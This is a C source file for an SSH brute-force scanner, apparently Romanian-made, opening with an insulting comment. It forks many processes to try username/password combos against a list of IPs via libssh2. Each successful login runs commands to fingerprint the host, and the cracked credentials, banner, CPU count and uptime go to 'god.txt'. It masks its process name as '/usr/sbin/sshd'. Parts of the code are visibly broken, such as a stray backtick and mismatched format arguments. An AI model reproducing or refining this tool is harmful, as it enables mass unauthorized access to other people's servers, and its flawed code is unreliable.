/// DoN te-a muit in 30 minute, te-am pupat nu am timp cu sclavi ca tn, kys vtm
/// Don't be mad anime boy
#include <sys/wait.h>
#include <time.h>
#include <getopt.h>
#include <sys/types.h>
#include <signal.h>
#include <netdb.h>
#include <math.h>
#define LIBSSH2_STATIC 1
#include <libssh2.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <ctype.h>
#ifndef LIBSSH2_CONFIG_H
#ifdef __VMS
#define LIBSSH2_CONFIG_H
#define ssize_t SSIZE_T
typedef unsigned int uint32_t ;
typedef unsigned int socklen_t;
#define HAVE_UNISTD_H
#define HAVE_STDLIB_H
#define HAVE_INTTYPES_H
#define HAVE_SYS_TIME_H
#define HAVE_SELECT
#define HAVE_UIO
#define HAVE_SYS_SOCKET.H
#define HAVE_NETINET_IN_H
#define HAVE_ARPA_INET_H
#define HAVE_GETTIMEOFDAY 1
#define POSIX_C_SOURCE
#define LIBSSH2DEBUG 1
#define HAVE_FIONBIO
#include <stropts.h>
#ifdef SO_STATE
#define SS_NBIO         0x100 
#endif
#define LIBSSH2_OPENSSL 1
#define LIBSSH2_HAVE_ZLIB
#define LIBSSH2_DH_GEX_NEW 1
#endif /* __VMS */
#endif /* LIBSSH2_CONFIG_H */
#define FAKE "/usr/sbin/sshd"
#include <stdlib.h>





int libssh2_session_block_directions(LIBSSH2_SESSION *session);
static int waitsocket(int socket_fd, LIBSSH2_SESSION *session)
{
    struct timeval timeout;
    int rc;
    fd_set fd;
    fd_set *writefd = NULL;
    fd_set *readfd = NULL;
    int dir;
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;
    FD_ZERO(&fd);
    FD_SET(socket_fd, &fd);
    dir = libssh2_session_block_directions(session);
    if(dir & LIBSSH2_SESSION_BLOCK_INBOUND)
        readfd = &fd;
    if(dir & LIBSSH2_SESSION_BLOCK_OUTBOUND)
        writefd = &fd;
    rc = select(socket_fd + 1, readfd, writefd, NULL, &timeout);
    return rc;
}




int timeout_sec = 10;
int maxchilds = 20;
int sockfd;
int reverse_lookup = 0;

void timeout(int s)
{
	close(sockfd);
}

int checkRoot(char *username,char *password,char *hostname, int portar, char *command)
{
	FILE* vulnf;
	const char *commandline = command;
	unsigned long hostaddr;
    int sock;
	int flag;
	int var;
	char warn[125]="";
	char banner[5000];
    struct sockaddr_in sin;
    const char *fingerprint;
    LIBSSH2_SESSION *session;
    LIBSSH2_CHANNEL *channel;
    int rc;
    int exitcode;
    char *exitsignal = (char *)"none";
    int bytecount = 0;
    size_t len;
    LIBSSH2_KNOWNHOSTS *nh;
    int type;
	#ifdef WIN32
		WSADATA wsadata;
		int err;
		err = WSAStartup(MAKEWORD(2, 0), &wsadata);
		if(err != 0) {
			fprintf(stderr, "WSAStartup failed with error: %d\n", err);
			return 1;
		}
	#endif
	rc = libssh2_init(0);
    if(rc != 0) {
        fprintf(stderr, "libssh2 initialization failed (%d)\n", rc);
        return 1;
    }
	struct sockaddr_in addr;

	addr.sin_family=AF_INET;
  addr.sin_port=htons(portar);
  addr.sin_addr.s_addr = inet_addr(hostname);
 

  if ((sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
		(void) alarm(0);
		exit(EXIT_FAILURE);
	}
	
	(void) signal(SIGALRM, &timeout); 
	(void) alarm(timeout_sec);

	if (connect(sockfd,(struct sockaddr *)&addr,sizeof(addr)) < 0) { 
		(void) alarm(0);
		 exit(EXIT_FAILURE);
	} 

	if (portar == 80)
    write(sockfd, "GET / HTTP/1.0\r\n\r\n", 19);

  (void) read(sockfd, banner, sizeof(banner));
 
	hostaddr = inet_addr(hostname);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	sin.sin_family = AF_INET;
    sin.sin_port = htons(portar);
    sin.sin_addr.s_addr = hostaddr;
    if(connect(sock, (struct sockaddr*)(&sin),
                sizeof(struct sockaddr_in)) != 0) {
        return -1;
    }
	session = libssh2_session_init();
    if(!session)
        return -1;
	while ((rc = libssh2_session_handshake(session, sock)) == LIBSSH2_ERROR_EAGAIN);
	if (rc) {
        return -1;
    }
	while ((rc = libssh2_userauth_password(session, username, password)) == LIBSSH2_ERROR_EAGAIN);
    if (rc) {
        goto shutdown;
    }
	  while( (channel = libssh2_channel_open_session(session)) == NULL &&
           libssh2_session_last_error(session,NULL,NULL,0) ==
           LIBSSH2_ERROR_EAGAIN )
		{
			waitsocket(sock, session);
		}
	 if( channel == NULL )
    {
        goto shutdown;
    }
	while( (rc = libssh2_channel_exec(channel, commandline)) ==
           LIBSSH2_ERROR_EAGAIN )
    {
        waitsocket(sock, session);
    }
	if( rc != 0 )
    {
        goto shutdown;
    }
	    for( ;; )
    {
        int rc;
        do
        {
            char buffer[65535];
            rc = libssh2_channel_read( channel, buffer, sizeof(buffer) );
			
			char buffer1[65535];
            rc = libssh2_channel_read( channel, buffer1, sizeof(buffer1) );

            char buffer2[65535];
            rc = libssh2_channel_read( channel, buffer2, sizeof(buffer2) );
			
            if( rc > 0 )
            {
                int i;
                bytecount += rc;
                hostname = strtok (hostname, "\n");
				 if ((unsigned)strlen(buffer) == 7)
				{
					fprintf(stderr, "\n\033[0;31m%s\033[0;37m[\033[0;31m+\033[0;37m] \033[0;35m#NOLOGIN - \033[0;37m%s:%s:%s |\033[0;31m[HoneyPot/BusyBox/NoBash/NoLogin]\n",username,password,hostname);
				vulnf=fopen("nogod.txt","a+");
				fprintf(vulnf,"%s[-] %s@%s %s [HoneyPot/BusyBox/NoBash/NoLogin] \n",username,hostname,password);
				fclose(vulnf);`
				}
				else
				{
				if(flag) strcpy(warn,"[Dublu] ");
				vulnf=fopen("god.txt","a+");
				
					fprintf(vulnf, "+------------------------------------------------------------------------------------------------------------------------------------+\n");
					fprintf(vulnf, "%s[+] #LOGIN - %s@%s:%s | %s",warn, username,hostname,password, buffer);
					fprintf(vulnf, "[Info] Banner - %s", banner);
					fprintf(vulnf, "[Info] Cores Proc - %s", buffer1);
					fprintf(vulnf, "[Info] Uptime - %s", buffer2);
					fprintf(vulnf, "+------------------------------------------------------------------------------------------------------------------------------------+\n");
				fprintf(stderr, "\n\033[0;31m%s\033[0;37m[\033[0;31m+\033[0;37m] \033[0;35m#LOGIN - \033[0;37m%s@%s:%s | \033[0;31m%s",warn, username,hostname,password, buffer);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mBanner - %s", banner);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mCores Proc - %s", buffer1);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mUptime - %s", buffer2);
				flag=1;
				}
                goto shutdown;
                for( i=0; i < rc; ++i )
                var = i;
            }
            else {
                if( rc != LIBSSH2_ERROR_EAGAIN )
                    goto shutdown;
            }
        }
        while( rc > 0 );
        if( rc == LIBSSH2_ERROR_EAGAIN )
        {
            waitsocket(sock, session);
        }
        else
            break;
    }
	shutdown:
	fclose(vulnf);
    libssh2_session_disconnect(session, "Normal Shutdown, Thank you for playing");
    libssh2_session_free(session);
#ifdef WIN32
    closesocket(sock);
#else
    close(sock);
#endif
    var = var;
    libssh2_exit();
    return 0;
}




int main(int argc,char *argv[])
{
	char *iplist,*passfile;
	int maxf,port,numforks,count = 0, i,j,countsave;
	FILE* passf;
	FILE* ip;
	char *c;
	char buff[65535];
	char *a[80196], nutt[65535], *temp, *t, *string;
	char *lastUser,*curpass;
	if (argv[1] && argv[2] && argv[3] && argv[4] )
	{
		maxf = atoi(argv[1]);
		iplist = argv[2];
		passfile = argv[3];
		port = atoi(argv[4]);
		if((passf=fopen(passfile,"r")) == NULL)
		{ 
			printf("\033[0;31m[\033[0;37m-\033[0;31m] - \033[0;37mFATAL: Nu gasesc %s",passfile);
			return 0;
		}
		else
		{
				  while (fgets(nutt,2024,passf))
				  {
					    while (t = strchr (nutt,' '))
						{
							  temp = strtok (nutt, " ");
							  string = strdup (temp);
							  a[count++]=string;
							  while (temp = strtok (NULL, "\n"))
							   {
								   string = strdup (temp);
								   a[count++]=string;
							   }
						}
				  }
				  fclose(passf);
				  countsave = count;				  
		 if((ip=fopen(iplist,"r")) == NULL)
			{ 
				printf("\033[0;31m[\033[0;37m-\033[0;31m] - \033[0;37mFATAL: Nu gasesc %s",iplist);
				return 0;
			}
			else
			{
				strcpy(argv[0],FAKE);  
				for (i=0; i<count; i=i+2)
				 {
					 printf("\033[0;31m[\033[0;36m+\033[0;31m] \033[0;37mCombo: \033[0;33m%s:%s \033[0;35m#HELLO#\033[0m\n",a[i],a[i+1]);
				 while(fgets(buff,sizeof(buff),ip))
				 {	
					  c=strchr(buff,' ');
					   if(c!=NULL) c=" ";
					  if (!(fork()))
					  {	
						
						for (i=0; i<count; i=i+2)
						 {
							  checkRoot(a[i],a[i+1],buff,port,"uname -v && grep -c ^processor /proc/cpuinfo &&  uptime"); // try to auth
						 }
						   exit(0);
					  }
					  else
					  {
							numforks++;
							  if (numforks > maxf)
							  for (numforks; numforks > maxf; numforks--)
							  wait(NULL);
					  }
					  if(i==count)
					  {
						printf("Gata scanu");
						exit(0);
					  }
				 }
			   }
			}
			fclose(ip);	 			
		}
					 
	}
	else
		 printf("\033[0;31m[\033[0;37m-\033[0;31m] - \033[0;37m Syntax: %s Thread-uri Iplist Passfile Port[22]",argv[0]);
	    getchar();
         exit (0);
         err:
         exit (-1);
}

